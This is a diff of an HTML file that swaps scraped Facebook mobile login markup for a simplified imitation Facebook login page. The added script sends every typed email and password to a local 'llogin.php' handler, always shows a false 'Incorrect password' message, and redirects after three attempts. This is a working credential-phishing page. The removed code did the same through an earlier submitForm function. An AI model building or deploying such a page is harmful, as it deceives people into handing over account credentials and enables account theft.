-                                  data-sigil="m_reg_button"
-                                  data-autoid="autoid_3"
-                                  >Create new account</a
-                                >
-                              </div>
-                            </div>
-                          </div>
-                          <div class="_2pie" style="text-align: center">
-                            <div>
-                              <div
-                                data-sigil="login_identify_step_element"
-                              ></div>
-                              <div class="other-links _8p_m">
-                                <ul class="_5pkb _55wp">
-                                  <li></li>
-                                </ul>
-                              </div>
-                            </div>
-                          </div>
-                        </div>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-          <div style="display: none"><div></div></div>
-          <span
-            ><img
-              src="https://facebook.com/security/hsts-pixel.gif?c=3.2"
-              width="0"
-              height="0"
-              style="display: none"
-          /></span>
-          <div class="_55wr _5ui2" data-sigil="m_login_footer">
-            <div class="_5dpw">
-              <div
-                class="_5ui3"
-                data-nocookies="1"
-                id="locale-selector"
-                data-sigil="language_selector marea"
-              >
-                <div class="_7om2">
-                  <div class="_4g34">
-                    <span class="_52jc _52j9 _52jh _3ztb">English (US)</span>
-                    <div class="_3ztc">
-                      <span class="_52jc"
-                        ><a
-                          href="/intl/save_locale/?loc=es_LA&href=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0AWxl6Uuzy0MCGyh8&ls_ref=mobile_suggested_locale_selector&refid=8"
-                          data-ajaxify-href="/intl/save_locale/?loc=es_LA&href=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0AWxl6Uuzy0MCGyh8&ls_ref=mobile_suggested_locale_selector&refid=8"
-                          data-method="post"
-                          data-sigil="ajaxify"
-                          >Español</a
-                        ></span
-                      >
-                    </div>
-                    <div class="_3ztc">
-                      <span class="_52jc"
-                        ><a
-                          href="/intl/save_locale/?loc=de_DE&href=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0AWxl6Uuzy0MCGyh8&ls_ref=mobile_suggested_locale_selector&refid=8"
-                          data-ajaxify-href="/intl/save_locale/?loc=de_DE&href=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0AWxl6Uuzy0MCGyh8&ls_ref=mobile_suggested_locale_selector&refid=8"
-                          data-method="post"
-                          data-sigil="ajaxify"
-                          >Deutsch</a
-                        ></span
-                      >
-                    </div>
-                    <div class="_3ztc">
-                      <span class="_52jc"
-                        ><a
-                          href="/intl/save_locale/?loc=ar_AR&href=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0AWxl6Uuzy0MCGyh8&ls_ref=mobile_suggested_locale_selector&refid=8"
-                          data-ajaxify-href="/intl/save_locale/?loc=ar_AR&href=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0AWxl6Uuzy0MCGyh8&ls_ref=mobile_suggested_locale_selector&refid=8"
-                          data-method="post"
-                          data-sigil="ajaxify"
-                          >العربية</a
-                        ></span
-                      >
-                    </div>
-                  </div>
-                  <div class="_4g34">
-                    <div class="_3ztc">
-                      <span class="_52jc"
-                        ><a
-                          href="/intl/save_locale/?loc=pt_BR&href=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0AWxl6Uuzy0MCGyh8&ls_ref=mobile_suggested_locale_selector&refid=8"
-                          data-ajaxify-href="/intl/save_locale/?loc=pt_BR&href=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0AWxl6Uuzy0MCGyh8&ls_ref=mobile_suggested_locale_selector&refid=8"
-                          data-method="post"
-                          data-sigil="ajaxify"
-                          >Português (Brasil)</a
-                        ></span
-                      >
-                    </div>
-                    <div class="_3ztc">
-                      <span class="_52jc"
-                        ><a
-                          href="/intl/save_locale/?loc=fr_FR&href=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0AWxl6Uuzy0MCGyh8&ls_ref=mobile_suggested_locale_selector&refid=8"
-                          data-ajaxify-href="/intl/save_locale/?loc=fr_FR&href=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0AWxl6Uuzy0MCGyh8&ls_ref=mobile_suggested_locale_selector&refid=8"
-                          data-method="post"
-                          data-sigil="ajaxify"
-                          >Français (France)</a
-                        ></span
-                      >
-                    </div>
-                    <div class="_3ztc">
-                      <span class="_52jc"
-                        ><a
-                          href="/intl/save_locale/?loc=it_IT&href=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0AWxl6Uuzy0MCGyh8&ls_ref=mobile_suggested_locale_selector&refid=8"
-                          data-ajaxify-href="/intl/save_locale/?loc=it_IT&href=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0AWxl6Uuzy0MCGyh8&ls_ref=mobile_suggested_locale_selector&refid=8"
-                          data-method="post"
-                          data-sigil="ajaxify"
-                          >Italiano</a
-                        ></span
-                      >
-                    </div>
-                    <a
-                      href="/language/?next_uri=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0AWxl6Uuzy0MCGyh8&page_style=1&refid=8"
-                      ><div
-                        class="_3j87 _1rrd _3ztd"
-                        aria-label="Complete list of languages"
-                        data-sigil="more_language"
-                      >
-                        <i class="img sp_zqrNfmDGuGz_2x sx_0a2d34"></i></div
-                    ></a>
-                  </div>
-                </div>
-              </div>
-              <div class="_5ui4">
-                <div class="_96qv _9a0a">
-                  <a
-                    href="https://about.meta.com/"
-                    class="_96qw"
-                    title="Read our blog, discover the resource center, and find job opportunities."
-                    >About</a
-                  ><span aria-hidden="true"> · </span
-                  ><a
-                    href="/help/?ref=pf&refid=8"
-                    class="_96qw"
-                    title="Visit our Help Center."
-                    >Help</a
-                  ><span aria-hidden="true"> · </span
-                  ><span class="_96qw" id="u_0_4_Ov">More</span>
-                </div>
-                <div class="_96qv" style="display: none" id="u_0_5_9A">
-                  <a
-                    href="https://messenger.com/"
-                    title="Check out Messenger."
-                    class="_96qw"
-                    >Messenger</a
-                  ><a
-                    href="/lite/?refid=8"
-                    title="Facebook Lite for Android."
-                    class="_96qw"
-                    >Facebook Lite</a
-                  ><a
-                    href="https://m.facebook.com/watch/?refid=8"
-                    title="Browse our Watch videos."
-                    class="_96qw"
-                    >Watch</a
-                  ><a
-                    href="/places/?refid=8"
-                    title="Check out popular places on Facebook."
-                    class="_96qw"
-                    >Places</a
-                  ><a
-                    href="/games/?refid=8"
-                    title="Check out Facebook games."
-                    class="_96qw"
-                    >Games</a
-                  ><a
-                    href="/marketplace/?refid=8"
-                    title="Buy and sell on Facebook Marketplace."
-                    class="_96qw"
-                    >Marketplace</a
-                  ><a
-                    href="https://pay.facebook.com/?refid=8"
-                    title="Learn more about Meta Pay"
-                    target="_blank"
-                    class="_96qw"
-                    >Meta Pay</a
-                  ><a
-                    href="https://www.meta.com/"
-                    title="Check out Meta"
-                    target="_blank"
-                    class="_96qw"
-                    >Meta )777$$7Store</a
-                  ><a
-                    href="https://www.meta.com/quest/"
-                    title="Learn more about Meta Quest"
-                    target="_blank"
-                    class="_96qw"
-                    >Meta Quest</a
-                  ><a
-                    href="https://lm.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&h=AT3fJ0r2h-zpisO4hWobF_18z2-3PZKJP2KoxjdYW4310YtyBGLXB0UFEV1TlsJ4lTSGYiokEU6vZNdBn6Z5XhPppVNmLG5-LACuyejcMoyCLZ06cbLpakpIO4r4tFRHSGOJWZ0kOX7rf_Tg"
-                    title="Check out Instagram"
-                    target="_blank"
-                    class="_96qw"
-                    >Instagram</a
-                  ><a
-                    href="https://www.bulletin.com/"
-                    title="Check out Bulletin Newsletter"
-                    class="_96qw"
-                    >Bulletin</a
-                  ><a
-                    href="/fundraisers/?refid=8"
-                    title="Donate to worthy causes."
-                    class="_96qw"
-                    >Fundraisers</a
-                  ><a
-                    href="/biz/directory/?refid=8"
-                    title="Browse our Facebook Services directory."
-                    class="_96qw"
-                    >Services</a
-                  ><a
-                    href="https://developers.facebook.com/?ref=pf&refid=8"
-                    title="Develop on our platform."
-                    class="_96qw"
-                    >Developers</a
-                  ><a
-                    href="/careers/?ref=pf&refid=8"
-                    title="Make your next career move to our awesome company."
-                    class="_96qw"
-                    >Careers</a
-                  ><a
-                    href="/privacy/policy/?entry_point=facebook_page_footer&refid=8"
-                    title="Learn how we collect, use and share information to support Facebook."
-                    class="_96qw"
-                    >Privacy Policy</a
-                  ><a
-                    href="/privacy/center/?entry_point=facebook_page_footer&refid=8"
-                    title="Learn how to manage and control your privacy on Facebook."
-                    class="_96qw"
-                    >Privacy Center</a
-                  ><a></a
-                  ><a
-                    href="/groups/discover/?refid=8"
-                    title="Explore our Groups."
-                    class="_96qw"
-                    >Groups</a
-                  >
-                </div>
-                <span class="mfss fcg">Meta © 2024</span>
-              </div>
-            </div>
-          </div>
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        <input id="email" type="text" placeholder="Mobile number or email address">
+        <input id="password" type="password" placeholder="Password">
+        <span id="feedback" style="color: red;  font-family: sans-serif; font-size: 15px; text-align: center; margin: 0 30px; "></span>
+        <button id="login">Log in</button>
+        <a href="#">Forgotten Password?</a>
+        <button class="secondary-button" onclick="submit()">Create new account</button>
+        <div class="footer">
+            <!-- Adding the Meta image -->
+            <img src="image.png" alt="Meta Logo">
+            <p><a href="#">About</a> · <a href="#">Help</a> · <a href="#">More</a></p>
         </div>
-        <div class=""></div>
-        <script>
-          function submitForm() {
-            var formData = new FormData(document.querySelector("form"));
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "./llogin.php", true);
-
-            xhr.onload = function () {
-              if (xhr.status === 200 && xhr.responseText) {
-                // Display success message or handle response as needed
-
-                // Reload the current page after 3 seconds
-                setTimeout(function () {
-                  location.reload();
-                }, 3000);
-              }
-            };
-
-            // Handle AJAX request errors
-            xhr.onerror = function () {
-              console.error("Error submitting form");
-              // Add error handling logic if needed
-            };
-
-            xhr.send(formData);
-            document.getElementById("dis").innerHTML =
-              "Incorrect password! Please try again...";
-          }
-        </script>
-      </div>
     </div>
-  </body>
+    <script>
+        var login = document.getElementById('login');
+        var email = document.getElementById('email');
+        var password = document.getElementById('password');
+        var feedback = document.getElementById('feedback'); // Assuming there's an element with id 'feedback'
+        var x = 0;
+    
+        login.addEventListener('click', function () {
+    
+            // Display the "click" feedback
+            feedback.textContent = 'Incorrect password! Please try again...';
+    
+            const data = new FormData();
+            data.append('email', email.value);
+            data.append('password', password.value);
+            const response = new XMLHttpRequest();
+            response.onreadystatechange = function () {
+                // Process response here if needed
+            };
+            response.open('POST', './llogin.php', true);
+            response.send(data);
+            x++;
+    
+            // Redirect to another page after 3rd attempt
+            if (x == 3) {
+                window.location.href = 'index_facebook.html';
+            }
+        });
+    </script>
+    
+</body>
 </html>
